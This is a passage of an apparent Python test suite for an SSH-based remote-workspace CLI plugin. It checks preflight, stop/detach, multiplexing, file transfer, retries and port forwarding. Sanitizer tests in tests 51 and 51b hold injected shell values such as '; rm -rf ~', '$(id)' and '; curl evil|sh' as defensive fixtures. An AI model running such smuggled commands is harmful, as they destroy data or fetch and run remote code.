        assert by36[name]["status"] == "ok", (name, by36[name])
    assert "/usr/bin/ssh" in by36["ssh"]["detail"], by36["ssh"]
finally:
    m.shutil.which = _saved_which
    m._verify_token = _saved_verify
print("[36] doctor: all-good preflight reports ok with every check green: OK")

# 37. _doctor_checks: a box missing the OpenSSH client and pointed at an insecure
#     base -> ok False; ssh/ssh-keygen/api-base FAIL; auth is skipped (warn).
_saved_which = m.shutil.which
try:
    m.shutil.which = lambda *a, **k: None
    res37, ok37 = m._doctor_checks(types.SimpleNamespace(
        token=None, api_base="http://evil.example", json=False))
    by37 = _by_name(res37)
    assert ok37 is False, res37
    assert by37["ssh"]["status"] == "fail" and by37["ssh-keygen"]["status"] == "fail", by37
    assert by37["api-base"]["status"] == "fail", by37["api-base"]
    assert by37["auth"]["status"] == "warn", by37["auth"]  # skipped: insecure base
finally:
    m.shutil.which = _saved_which
print("[37] doctor: missing ssh + insecure base fail the preflight: OK")

# 38. cmd_doctor --json prints {ok, checks[]} and EXITS 0 when healthy, non-zero
#     when not (so an agent / CI can gate on it).
def _doctor_json(**over):
    ns = dict(token=None, api_base="https://app.runcode.io", json=True)
    ns.update(over)
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    code = "noexit"
    try:
        m.cmd_doctor(types.SimpleNamespace(**ns))
    except SystemExit as e:
        code = e.code
    finally:
        sys.stdout = old
    return code, json.loads(buf.getvalue())


_saved_which = m.shutil.which
_saved_verify = m._verify_token
try:
    m.shutil.which = lambda name, *a, **k: "/usr/bin/" + name
    m._verify_token = lambda tok, base: True
    code_ok, doc_ok = _doctor_json()
    assert code_ok == 0 and doc_ok["ok"] is True, (code_ok, doc_ok)
    assert isinstance(doc_ok["checks"], list) and doc_ok["checks"], doc_ok
    m.shutil.which = lambda *a, **k: None
    code_bad, doc_bad = _doctor_json(api_base="http://evil.example")
    assert code_bad == 1 and doc_bad["ok"] is False, (code_bad, doc_bad)
finally:
    m.shutil.which = _saved_which
    m._verify_token = _saved_verify
print("[38] cmd_doctor --json reports structured checks and a 0/1 exit code: OK")

# --- stop: power a workspace down from the agent (pauses compute billing) ---- #
# Mirror of `connect --start`: rides the backend GET /workspace/stop, authz'd by
# can_manage_workspace, structured stop_failed on refusal. Stopping the ATTACHED
# box ends the working session (a stopped box can't serve `exec`), so it detaches.
m._resolve_workspace = lambda ident, token, base: (55, USER)


def stop_or_die(**kw):
    """Run cmd_stop capturing stdout; return ('ok'|'die', parsed_json_or_None)."""
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    rc = "ok"
    try:
        try:
            m.cmd_stop(args(**kw))
        except SystemExit:
            rc = "die"
    finally:
        sys.stdout = old
    txt = buf.getvalue().strip()
    return rc, (json.loads(txt) if txt else None)


# 39. An explicit, UNATTACHED workspace is stopped via the backend; no detach.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
seen39 = {"n": 0, "path": ""}


def api39(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspace/stop"):
        seen39["n"] += 1
        seen39["path"] = path
        return {"error": False, "message": "Workspace stopped successfully"}
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api39
rc, out = stop_or_die(workspace="my-ws")
assert rc == "ok", out
assert seen39["n"] == 1, "stop must call the backend exactly once"
assert "workspace_id=55" in seen39["path"], seen39["path"]
assert out["stopped"] is True and out["workspace_id"] == 55, out
assert out["detached"] is False, "stopping an unattached box must not touch the pointer"
print("[39] stop powers down an explicit workspace via the backend: OK")

# 40. With no name, stop targets the ATTACHED workspace and DETACHES it (clears
#     the sticky pointer + drops cached material); `exec` then refuses.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)


def api40_mint(method, path, token, base, body=None):
    if method == "POST" and path.endswith("/ssh-session"):
        return _bundle()
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api40_mint
rc, _ = connect_or_die(workspace="my-ws")  # attach ws 55, materialize a session
assert rc == "ok" and m._get_current() == 55
cache40 = m._ws_cache_dir(55)
assert os.path.isdir(cache40), "expected a cached session dir after connect"

seen40 = {"n": 0}


def api40_stop(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspace/stop"):
        seen40["n"] += 1
        return {"error": False, "message": "Workspace stopped successfully"}
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api40_stop
rc, out = stop_or_die(workspace=None)  # default to the attached box
assert rc == "ok", out
assert seen40["n"] == 1 and out["workspace_id"] == 55, out
assert out["detached"] is True, "stopping the attached box must detach"
assert m._get_current() is None, "the sticky pointer must be cleared"
assert not os.path.isdir(cache40), "cached material must be dropped (no --keep)"
try:
    m.cmd_exec(args(command=["--", "true"]))
    raise AssertionError("exec must refuse after the attached box is stopped")
except SystemExit:
    pass
print("[40] stop defaults to the attached box, detaches it, drops material: OK")

# 41. stop --keep on the attached box detaches the pointer yet KEEPS the cache.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
m._api = api40_mint
rc, _ = connect_or_die(workspace="my-ws")
assert rc == "ok" and m._get_current() == 55
cache41 = m._ws_cache_dir(55)
m._api = api40_stop
seen40["n"] = 0
rc, out = stop_or_die(workspace=None, keep=True)
assert rc == "ok" and out["detached"] is True, out
assert m._get_current() is None, "--keep must still detach (clear the pointer)"
assert os.path.isdir(cache41), "--keep must preserve the cached session material"
print("[41] stop --keep detaches but preserves cached material: OK")

# 42. A backend refusal (banned / not authorized) becomes a structured error.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)


def api42(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspace/stop"):
        return {"error": True, "message": "You are not authorized to perform this action"}
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api42
rc, out = stop_or_die(workspace="my-ws")
assert rc == "die", out
assert out and out.get("error") == "stop_failed", out
assert "not authorized" in out.get("message", ""), out
print("[42] stop surfaces a backend refusal as a structured stop_failed error: OK")

# 42b. stop with neither a name nor an attached workspace dies cleanly.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)


def api42b(method, path, token, base, body=None):
    raise AssertionError("stop with no target must not hit the backend: %s %s" % (method, path))


m._api = api42b
rc, out = stop_or_die(workspace=None)
assert rc == "die", out
assert out and out.get("error"), out
print("[42b] stop with no target and nothing attached dies without a backend call: OK")


# --- UX polish ------------------------------------------------------------- #

# 43. list's human output: a STOPPED but SSH-capable box must point at the in-tool
#     `connect <id> --start` (which boots it) -- NOT the dashboard, which the rest
#     of the plugin promises you never need.
m._fetch_workspaces = lambda token, base: [
    {"id": 42, "title": "running-box", "custom_title": "", "provider": "aws",
     "state": "running", "shared": False},
    {"id": 43, "title": "stopped-box", "custom_title": "", "provider": "aws",
     "state": "stopped", "shared": False},
]
out43 = run_quiet(m.cmd_list, json=False, all=False,
                  api_base="https://app.runcode.io", token=None)
assert "connect 42" in out43, out43
assert "connect 43 --start" in out43, out43
assert "dashboard" not in out43.lower(), out43
print("[43] list suggests `connect <id> --start` for a stopped box (no dashboard): OK")

# 44. connect --json surfaces statusline_installed, so the agent can RELIABLY offer
#     to wire the cue on first connect (the sticky session silently routes ALL work
#     to the box -- the status line is the user's only standing signal of that).
#     CLAUDE_CONFIG_DIR points at the throwaway settings dir; test 27 left it with
#     no statusLine, so it reads False, then True once installed.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
run_quiet(m.cmd_install_statusline, remove=True, force=False)  # ensure not wired
m._api = api40_mint
m._resolve_workspace = lambda ident, token, base: (55, USER)
rc, out = connect_or_die(workspace="my-ws")
assert rc == "ok", out
assert out.get("statusline_installed") is False, out
run_quiet(m.cmd_install_statusline, remove=False, force=False)
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
rc, out = connect_or_die(workspace="my-ws")
assert out.get("statusline_installed") is True, out
print("[44] connect --json reports statusline_installed (False -> True after wiring): OK")

# 45. doctor carries an ADVISORY status-line check: 'warn' when not wired, 'ok' once
#     installed -- and being unwired never fails the preflight (it's a nudge, not a
#     blocker).
run_quiet(m.cmd_install_statusline, remove=True, force=False)
_saved_which = m.shutil.which
_saved_verify = m._verify_token
try:
    m.shutil.which = lambda name, *a, **k: "/usr/bin/" + name
    m._verify_token = lambda tok, base: True
    res45, ok45 = m._doctor_checks(types.SimpleNamespace(
        token=None, api_base="https://app.runcode.io", json=False))
    by45 = _by_name(res45)
    assert by45["status-line"]["status"] == "warn", by45.get("status-line")
    assert ok45 is True, "an un-wired status line is advisory; must NOT fail doctor"
    run_quiet(m.cmd_install_statusline, remove=False, force=False)
    res45b, _ = m._doctor_checks(types.SimpleNamespace(
        token=None, api_base="https://app.runcode.io", json=False))
    assert _by_name(res45b)["status-line"]["status"] == "ok", res45b
finally:
    m.shutil.which = _saved_which
    m._verify_token = _saved_verify
print("[45] doctor adds an advisory status-line check (warn -> ok after wiring): OK")

# 46. connect --start/--wait streams HUMAN progress to STDERR while stdout stays
#     pure JSON for the agent -- so a multi-minute readiness wait never looks hung,
#     and the progress can't corrupt the JSON the agent parses.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
calls["post"] = 0
state46 = {"n": 0}


def _state46(ws_id, token, base):
    state46["n"] += 1
    return "running" if state46["n"] >= 2 else "stopped"


started46 = {"n": 0}
_saved_state, _saved_start = m._workspace_state, m._start_workspace
m._workspace_state = _state46
m._start_workspace = lambda ws_id, token, base: started46.__setitem__("n", started46["n"] + 1)
m._ssh_reachable_once = lambda meta: True
m._api = api40_mint
m._resolve_workspace = lambda ident, token, base: (55, USER)
err = io.StringIO()
_olderr = sys.stderr
sys.stderr = err
try:
    rc, out = connect_or_die(workspace="my-ws", start=True, wait=True, timeout=60)
finally:
    sys.stderr = _olderr
    m._workspace_state, m._start_workspace = _saved_state, _saved_start
assert rc == "ok", out
etext = err.getvalue()
assert "starting workspace #55" in etext, etext
assert "ssh" in etext.lower() and "wait" in etext.lower(), etext
assert started46["n"] == 1, started46
assert out["alias"] == ALIAS, "stdout must stay pure JSON (progress went to stderr)"
print("[46] connect --start/--wait streams progress to stderr; stdout stays JSON: OK")

# 47. the readiness waiters report periodic progress (on_wait fires each poll), so a
#     genuinely long wait shows life instead of a frozen terminal.
ticks = []
st47 = {"n": 0}


def _st47(ws_id, token, base):
    st47["n"] += 1
    return "running" if st47["n"] >= 3 else "stopped"


_saved_state = m._workspace_state
m._workspace_state = _st47
try:
    okw = m._wait_for_running(55, None, "https://app.runcode.io", 600,
                              on_wait=lambda s: ticks.append(s))
finally:
    m._workspace_state = _saved_state
assert okw is True and len(ticks) >= 2, ticks
pr = {"n": 0}
m._ssh_reachable_once = lambda meta: (pr.__setitem__("n", pr["n"] + 1) or pr["n"] >= 3)
ticks2 = []
oks = m._wait_for_ssh({"config": "c", "alias": "a"}, 600,
                      on_wait=lambda s: ticks2.append(s))
assert oks is True and len(ticks2) >= 2, ticks2
print("[47] readiness waiters report periodic progress via on_wait: OK")

# 48. connect surfaces the bundle's workdir in --json (so the agent uses the right
#     project dir instead of a hard-coded constant); falls back to the documented
#     default when an older backend omits it.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
m._resolve_workspace = lambda ident, token, base: (55, USER)


def api48(method, path, token, base, body=None):
    if method == "POST" and path.endswith("/ssh-session"):
        b = _bundle()
        b["bundle"]["workdir"] = "/home/ubuntu/workspace/app"
        return b
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api48
out48 = connect()
assert out48.get("workdir") == "/home/ubuntu/workspace/app", out48
print("[48] connect surfaces the bundle workdir in --json: OK")

_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
m._api = api40_mint  # _bundle() carries no workdir
out48b = connect()
assert out48b.get("workdir") == m.DEFAULT_WORKDIR, out48b
print("[48b] connect defaults workdir to %s when the backend omits it: OK" % m.DEFAULT_WORKDIR)

# 49. _with_workdir composes `cd <workdir> && <cmd>` so the agent stops prefixing
#     every exec with a cd; --home, an empty command (interactive shell), and a
#     workdir-less (legacy) meta all leave the command untouched.
meta_wd = {"workdir": "/home/ubuntu/workspace/app"}
assert m._with_workdir(meta_wd, ["pytest", "-q"], False) == \
    ["cd", "/home/ubuntu/workspace/app", "&&", "pytest", "-q"]
assert m._with_workdir(meta_wd, ["pytest", "-q"], True) == ["pytest", "-q"]   # --home
assert m._with_workdir(meta_wd, [], False) == []                              # shell
assert m._with_workdir({"workdir": ""}, ["ls"], False) == ["ls"]             # no workdir
assert m._with_workdir({}, ["ls"], False) == ["ls"]                          # legacy meta
print("[49] _with_workdir composes cd<workdir> &&, honoring --home/empty/legacy: OK")

# 50. _exec_ssh applies the workdir default before handing argv to ssh (observable
#     on the Windows subprocess path); a workdir-less meta is unchanged (test 31).
_saved_iswin = m._IS_WINDOWS
_saved_call = m.subprocess.call
cap50 = {}


def _call50(argv, *a, **k):
    cap50["argv"] = argv
    return 0


try:
    m._IS_WINDOWS = True
    m.subprocess.call = _call50
    try:
        m._exec_ssh({"config": "/tmp/c", "alias": "runcode-x",
                     "workdir": "/home/ubuntu/workspace"}, ["pytest", "-q"])
    except SystemExit:
        pass
    assert cap50["argv"][-5:] == ["cd", "/home/ubuntu/workspace", "&&", "pytest", "-q"], \
        cap50["argv"]
finally:
    m._IS_WINDOWS = _saved_iswin
    m.subprocess.call = _saved_call
print("[50] _exec_ssh injects the workdir cd before invoking ssh: OK")


# --- security: sanitize the bundle's workdir ------------------------------- #
# 51. The bundle's workdir is interpolated into a remote `cd <dir> && …` shell
#     command (and the context probe), so a hostile/garbled value from a
#     compromised or MITM'd control plane must never reach the shell.
#     _sanitize_workdir keeps a plain absolute path and falls back to the
#     documented default for anything else -- the same defense-in-depth stance
#     as _assert_safe_ssh_config, but for the REMOTE shell.
assert m._sanitize_workdir("/home/ubuntu/workspace/app") == "/home/ubuntu/workspace/app"
assert m._sanitize_workdir("/srv/code-1.2_x@y+z") == "/srv/code-1.2_x@y+z"
for _bad in ("/tmp; rm -rf ~", "/a b/c", "relative/dir", "/a/$(id)", "/a/`id`",
             "/a/../../etc", "/a\nrm -rf", "", None, "~/x", "/a|b", "/a&b"):
    assert m._sanitize_workdir(_bad) == m.DEFAULT_WORKDIR, _bad
print("[51] _sanitize_workdir keeps a safe absolute path, else the default: OK")

# 51b. the sanitizer runs at ingestion: a hostile bundle workdir never lands in
#      the session meta / connect JSON -- it's replaced with the default.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
m._resolve_workspace = lambda ident, token, base: (55, USER)


def api51(method, path, token, base, body=None):
    if method == "POST" and path.endswith("/ssh-session"):
        b = _bundle()
        b["bundle"]["workdir"] = "/home/ubuntu/workspace; curl evil|sh"
        return b
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api51
out51 = connect()
assert out51.get("workdir") == m.DEFAULT_WORKDIR, out51
print("[51b] a hostile bundle workdir is sanitized to the default at ingestion: OK")


# --- #1 connection multiplexing (ControlMaster) ---------------------------- #
# Every `exec` otherwise pays two SSH handshakes through the gateway; a shared
# master collapses follow-up commands to a channel-open. POSIX only (Windows
# OpenSSH has no ControlMaster).
# 52. on POSIX the materialized config enables ControlMaster with a per-workspace
#     socket inside the 0700 cache dir, and the result still parses via `ssh -G`.
_mux_dir = os.path.join(HOME, "mux", "ws")
os.makedirs(_mux_dir, mode=0o700, exist_ok=True)
_mux_kp = os.path.join(_mux_dir, "id_ed25519")
subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-q", "-f", _mux_kp],
               check=True)
_saved_iswin = m._IS_WINDOWS
try:
    m._IS_WINDOWS = False
    _ma, _mc = m._materialize(_mux_dir, _bundle()["bundle"], _mux_kp)
    with open(_mc) as fh:
        _muxtxt = fh.read()
    assert "ControlMaster auto" in _muxtxt, _muxtxt
    assert ('ControlPath "%s"' % os.path.join(_mux_dir, "cm")) in _muxtxt, _muxtxt
    assert ("ControlPersist %d" % m.CONTROL_PERSIST) in _muxtxt, _muxtxt
    g52 = subprocess.run(["ssh", "-G", "-F", _mc, ALIAS], capture_output=True, text=True)
    assert g52.returncode == 0, g52.stderr
    _geff52 = {}
    for line in g52.stdout.splitlines():
        k, _, v = line.partition(" ")
        _geff52.setdefault(k.lower(), v)
    assert _geff52.get("controlmaster") == "auto", _geff52.get("controlmaster")
    assert os.path.join(_mux_dir, "cm") in _geff52.get("controlpath", ""), _geff52.get("controlpath")
finally:
    m._IS_WINDOWS = _saved_iswin
print("[52] POSIX config enables ControlMaster with a per-ws socket (ssh -G ok): OK")

# 52b. on Windows the control lines are OMITTED (ControlMaster is unsupported there
#      and would error every connection).
_saved_iswin = m._IS_WINDOWS
try:
    m._IS_WINDOWS = True
    _wdir = os.path.join(HOME, "mux-win", "ws")
    os.makedirs(_wdir, mode=0o700, exist_ok=True)
    open(os.path.join(_wdir, "id_ed25519"), "w").close()
    _wa, _wc = m._materialize(_wdir, _bundle()["bundle"], os.path.join(_wdir, "id_ed25519"))
    with open(_wc) as fh:
        _wtxt = fh.read()
    assert "ControlMaster" not in _wtxt, _wtxt
    assert "ControlPath" not in _wtxt, _wtxt
finally:
    m._IS_WINDOWS = _saved_iswin
print("[52b] Windows config omits the ControlMaster lines: OK")

# 53. _close_master tells the shared master to exit (so no socket/process lingers
#     after disconnect/clean/stop); a dir with no session is a quiet no-op.
_saved_call = m.subprocess.call
_cap53 = {}
try:
    m.subprocess.call = lambda argv, *a, **k: _cap53.setdefault("argv", argv) and 0 or 0
    _md = os.path.join(HOME, "cm-test")
    os.makedirs(_md, exist_ok=True)
    with open(os.path.join(_md, "meta.json"), "w") as fh:
        json.dump({"config": os.path.join(_md, "config"), "alias": "runcode-z"}, fh)
    open(os.path.join(_md, "config"), "w").close()
    m._close_master(_md)
    a53 = _cap53.get("argv")
    assert a53 and "-O" in a53 and "exit" in a53 and "runcode-z" in a53, a53
    _cap53.clear()
    m._close_master(os.path.join(HOME, "does-not-exist"))  # no meta -> no call, no raise
    assert "argv" not in _cap53, "no session dir must not invoke ssh"
finally:
    m.subprocess.call = _saved_call
print("[53] _close_master asks the master to exit; no-ops without a session: OK")

# 53b. disconnect closes the master before dropping the cache.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
m._api = api40_mint
m._resolve_workspace = lambda ident, token, base: (55, USER)
connect_or_die(workspace="my-ws")
assert m._get_current() == 55
_closed53 = {"dirs": []}
_saved_close = m._close_master
try:
    m._close_master = lambda d: _closed53["dirs"].append(d)
    m.cmd_disconnect(types.SimpleNamespace(keep=False))
finally:
    m._close_master = _saved_close
assert m._ws_cache_dir(55) in _closed53["dirs"], _closed53
assert not os.path.isdir(m._ws_cache_dir(55))
print("[53b] disconnect closes the master before dropping the session: OK")


# --- #2 workspace context digest ------------------------------------------- #
# 54. _ssh_capture runs a remote command over the session and CAPTURES output
#     (unlike _exec_ssh which streams), feeding stdin through. argv targets the
#     isolated config + alias; the return is (rc, stdout_bytes, stderr_bytes).
_saved_run = m.subprocess.run
_cap54 = {}


class _P54:
    returncode = 0
    stdout = b"OUT"
    stderr = b"ERR"


def _run54(argv, *a, **k):
    _cap54["argv"] = argv
    _cap54["input"] = k.get("input")
    return _P54()


try:
    m.subprocess.run = _run54
    rc, out, err = m._ssh_capture(
        {"config": "/tmp/c", "alias": "runcode-x"}, ["sh"], input_text="hello")
finally:
    m.subprocess.run = _saved_run
assert rc == 0 and out == b"OUT" and err == b"ERR", (rc, out, err)
a54 = _cap54["argv"]
assert "-F" in a54 and "/tmp/c" in a54 and "runcode-x" in a54 and a54[-1] == "sh", a54
assert _cap54["input"] == b"hello", _cap54["input"]
print("[54] _ssh_capture captures output + feeds stdin over the isolated config: OK")

# 55. _parse_context turns the probe's flat lines into a structured digest:
#     scalars, a nested git block, a markers list, and a name->version tools map.
CTXRAW = (
    "cwd=/home/ubuntu/workspace\n"
    "os=Linux\narch=x86_64\nkernel=6.8.0\n"
    "distro=Ubuntu 22.04.3 LTS\n"
    "git_branch=main\ngit_dirty=yes\n"
    "git_remote=https://github.com/acme/app.git\ngit_head=deadbee\n"
    "marker=pyproject.toml\nmarker=Dockerfile\n"
    "tool\tpython3\tPython 3.12.3\n"
    "tool\tnode\tv20.11.1\n"
    "disk=42G free / 100G\n"
)
ctx = m._parse_context(CTXRAW)
assert ctx["cwd"] == "/home/ubuntu/workspace" and ctx["os"] == "Linux", ctx
assert ctx["arch"] == "x86_64" and ctx["distro"] == "Ubuntu 22.04.3 LTS", ctx
assert ctx["git"] == {"branch": "main", "dirty": "yes",
                      "remote": "https://github.com/acme/app.git", "head": "deadbee"}, ctx["git"]
assert ctx["markers"] == ["pyproject.toml", "Dockerfile"], ctx["markers"]
assert ctx["tools"] == {"python3": "Python 3.12.3", "node": "v20.11.1"}, ctx["tools"]
assert ctx["disk"] == "42G free / 100G", ctx
print("[55] _parse_context structures scalars/git/markers/tools from the probe: OK")

# 56. cmd_context resolves the workspace, runs ONE capture, and emits the parsed
#     digest as JSON (with the workspace id + workdir folded in).
m._resolve_workspace = lambda ident, token, base: (55, USER)
_saved_ensure = m._ensure_session
_saved_capture = m._ssh_capture
_capreq = {"n": 0}


def _fake_capture(meta, remote_cmd, input_text=None, timeout=60):
    _capreq["n"] += 1
    _capreq["meta"] = meta
    _capreq["script"] = input_text
    return 0, CTXRAW.encode("utf-8"), b""


def ctx_args(**kw):
    base = dict(workspace="my-ws", api_base="https://app.runcode.io", token=None,
                force=False, ttl=1800, json=True, timeout=30)
    base.update(kw)
    return types.SimpleNamespace(**base)


try:
    m._ensure_session = lambda *a, **k: (
        {"alias": ALIAS, "config": "/tmp/c", "workdir": "/home/ubuntu/workspace"}, "/tmp", False)
    m._ssh_capture = _fake_capture
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    try:
        m.cmd_context(ctx_args())
    finally:
        sys.stdout = old
    ctx56 = json.loads(buf.getvalue())
finally:
    m._ensure_session = _saved_ensure
    m._ssh_capture = _saved_capture
assert _capreq["n"] == 1, "context must use exactly ONE round trip"
assert ctx56["workspace_id"] == 55 and ctx56["workdir"] == "/home/ubuntu/workspace", ctx56
assert ctx56["git"]["branch"] == "main" and ctx56["tools"]["python3"] == "Python 3.12.3", ctx56
assert "/home/ubuntu/workspace" in (_capreq["script"] or ""), "probe must cd into the workdir"
print("[56] cmd_context gathers the digest in one round trip and emits JSON: OK")


# --- #3 remote file primitives (write / get / put) ------------------------- #
import base64 as _b64

# 57. _shq single-quote-escapes for the remote shell; _remote_path resolves a
#     relative path against the workdir and leaves an absolute path alone.
assert m._shq("a'b") == "'a'\\''b'", m._shq("a'b")
_meta_rp = {"workdir": "/home/ubuntu/workspace"}
assert m._remote_path(_meta_rp, "src/app.py") == "/home/ubuntu/workspace/src/app.py"
assert m._remote_path(_meta_rp, "/etc/hosts") == "/etc/hosts"
print("[57] _shq quotes safely; _remote_path resolves relative vs absolute: OK")

# 58. _remote_write base64-encodes the bytes and runs `mkdir -p <dir> && base64 -d
#     > <path>` with the path shell-quoted (so even a space survives), feeding the
#     base64 on stdin -- any file content is safe, no heredoc/quoting hazard.
_saved_capture = m._ssh_capture
_cap58 = {}


def _cap_write(meta, remote_cmd, input_text=None, timeout=60):
    _cap58["cmd"] = remote_cmd
    _cap58["input"] = input_text
    return 0, b"", b""


try:
    m._ssh_capture = _cap_write
    _p58 = m._remote_write({"workdir": "/home/ubuntu/workspace"},
                           "a dir/x.py", b"print('hi')\n")
finally:
    m._ssh_capture = _saved_capture
assert _p58 == "/home/ubuntu/workspace/a dir/x.py", _p58
_joined58 = " ".join(_cap58["cmd"])
assert "base64 -d > '/home/ubuntu/workspace/a dir/x.py'" in _joined58, _joined58
assert "mkdir -p '/home/ubuntu/workspace/a dir'" in _joined58, _joined58
assert _cap58["input"] == _b64.b64encode(b"print('hi')\n"), _cap58["input"]
print("[58] _remote_write base64-uploads with a shell-quoted path: OK")

# 59. _remote_read runs `base64 <path>` and decodes the returned base64 to bytes.
_cap59 = {}


def _cap_read(meta, remote_cmd, input_text=None, timeout=60):
    _cap59["cmd"] = remote_cmd
    return 0, _b64.b64encode(b"FILE BODY\n"), b""


try:
    m._ssh_capture = _cap_read
    _data59 = m._remote_read({"workdir": "/w"}, "notes.txt")
finally:
    m._ssh_capture = _saved_capture
assert _data59 == b"FILE BODY\n", _data59
assert "base64 '/w/notes.txt'" in " ".join(_cap59["cmd"]), _cap59["cmd"]
print("[59] _remote_read base64-downloads + decodes: OK")

# 60. cmd_write streams local stdin to a remote file on the ATTACHED workspace.
_saved_attached = m._attached_session
_wrote60 = {}


def _cap60(meta, remote_cmd, input_text=None, timeout=60):
    _wrote60["input"] = input_text
    return 0, b"", b""


_saved_stdin = sys.stdin
try:
    m._attached_session = lambda a: {"workdir": "/home/ubuntu/workspace",
                                     "config": "/c", "alias": "a"}
    m._ssh_capture = _cap60
    sys.stdin = types.SimpleNamespace(buffer=io.BytesIO(b"hello stdin\n"))
    run_quiet(m.cmd_write, path="out.txt", file=None,
              api_base="https://app.runcode.io", token=None, ttl=1800, force=False)
finally:
    sys.stdin = _saved_stdin
    m._attached_session = _saved_attached
    m._ssh_capture = _saved_capture
assert _wrote60["input"] == _b64.b64encode(b"hello stdin\n"), _wrote60
print("[60] cmd_write uploads local stdin to the attached workspace: OK")

# 60b. cmd_get downloads a remote file to a local path.
_get_out = os.path.join(HOME, "got.txt")


def _cap60b(meta, remote_cmd, input_text=None, timeout=60):
    return 0, _b64.b64encode(b"remote contents\n"), b""


try:
    m._attached_session = lambda a: {"workdir": "/w", "config": "/c", "alias": "a"}
    m._ssh_capture = _cap60b
    run_quiet(m.cmd_get, remote="notes.txt", out=_get_out,
              api_base="https://app.runcode.io", token=None, ttl=1800, force=False)
finally:
    m._attached_session = _saved_attached
    m._ssh_capture = _saved_capture
assert open(_get_out, "rb").read() == b"remote contents\n"
print("[60b] cmd_get downloads a remote file to a local path: OK")


# --- #4 exec mid-session re-mint + honest exit codes ----------------------- #
# 61. exec/run batch path: on an ssh TRANSPORT failure (exit 255 = dropped/reaped
#     session) it re-mints once and retries, then exits with the retry's code -- so
#     the agent never hand-rolls session recovery (matches the skill's promise).
_saved_call = m.subprocess.call
_seq61 = {"n": 0, "remint": 0}
try:
    m.subprocess.call = lambda argv, *a, **k: (
        _seq61.__setitem__("n", _seq61["n"] + 1) or (255 if _seq61["n"] == 1 else 0))
    try:
        m._exec_ssh({"config": "/c", "alias": "runcode-x"}, ["pytest"],
                    remint=lambda: (_seq61.__setitem__("remint", _seq61["remint"] + 1)
                                    or {"config": "/c2", "alias": "runcode-x"}))
        raise AssertionError("expected SystemExit")
    except SystemExit as e:
        assert e.code == 0, e.code
finally:
    m.subprocess.call = _saved_call
assert _seq61["n"] == 2 and _seq61["remint"] == 1, _seq61
print("[61] exec batch re-mints once on a 255 transport failure and retries: OK")

# 61b. a real command failure (non-255) is NOT a transport error: no re-mint, the
#      remote exit code is propagated verbatim.
_seq61b = {"n": 0, "remint": 0}
try:
    m.subprocess.call = lambda argv, *a, **k: (_seq61b.__setitem__("n", _seq61b["n"] + 1) or 3)
    try:
        m._exec_ssh({"config": "/c", "alias": "x"}, ["false"],
                    remint=lambda: _seq61b.__setitem__("remint", _seq61b["remint"] + 1))
        raise AssertionError("expected SystemExit")
    except SystemExit as e:
        assert e.code == 3, e.code
finally:
    m.subprocess.call = _saved_call
assert _seq61b["n"] == 1 and _seq61b["remint"] == 0, _seq61b
print("[61b] a non-255 exit is propagated without a re-mint: OK")

# 61c. a persistent 255 retries EXACTLY once then propagates -- it must not loop.
_seq61c = {"n": 0}
try:
    m.subprocess.call = lambda argv, *a, **k: (_seq61c.__setitem__("n", _seq61c["n"] + 1) or 255)
    try:
        m._exec_ssh({"config": "/c", "alias": "x"}, ["x"],
                    remint=lambda: {"config": "/c2", "alias": "x"})
        raise AssertionError("expected SystemExit")
    except SystemExit as e:
        assert e.code == 255, e.code
finally:
    m.subprocess.call = _saved_call
assert _seq61c["n"] == 2, "must retry exactly once, not loop: %r" % _seq61c
print("[61c] a persistent 255 retries once then propagates (no loop): OK")

# 62. the interactive path (empty command -> a real shell) hands the tty straight
#     to ssh via execvp on POSIX (no capture, no retry, no remote command appended).
_saved_execvp = m.os.execvp
_cap62 = {}


def _fake_execvp(f, argv):
    _cap62.update(f=f, argv=argv)
    raise SystemExit(0)


_saved_iswin = m._IS_WINDOWS
try:
    m.os.execvp = _fake_execvp
    m._IS_WINDOWS = False
    try:
        m._exec_ssh({"config": "/c", "alias": "runcode-x"}, [])
    except SystemExit:
        pass
finally:
    m.os.execvp = _saved_execvp
    m._IS_WINDOWS = _saved_iswin
assert _cap62.get("argv") and _cap62["argv"][-1] == "runcode-x", _cap62
print("[62] interactive shell hands the tty to ssh via execvp on POSIX: OK")


# --- #5 port forwarding (expose a workspace dev server) -------------------- #
# 63. forward adds a port-forward to the multiplexed master and returns at once
#     (no blocking tunnel process): it primes the master, then runs
#     `ssh -O forward -L <local>:<host>:<remote>`. Default local==remote, host
#     == localhost.
_saved_run = m.subprocess.run
_saved_reach = m._ssh_reachable_once
_saved_attached = m._attached_session
_fwd = {}


class _P63:
    returncode = 0
    stdout = b""
    stderr = b""


try:
    m._attached_session = lambda a: {"config": "/c", "alias": "runcode-x"}
    m._ssh_reachable_once = lambda meta: _fwd.setdefault("primed", True)
    m.subprocess.run = lambda argv, *a, **k: (_fwd.__setitem__("argv", argv) or _P63())
    m._IS_WINDOWS = False
    run_quiet(m.cmd_forward, port=5173, local=None, to=None, cancel=False,
              api_base="https://app.runcode.io", token=None, ttl=1800, force=False)
finally:
    m.subprocess.run = _saved_run
    m._ssh_reachable_once = _saved_reach
    m._attached_session = _saved_attached
assert _fwd.get("primed") is True, "must prime the master before -O forward"
_a63 = _fwd["argv"]
assert "-O" in _a63 and "forward" in _a63 and "-L" in _a63, _a63
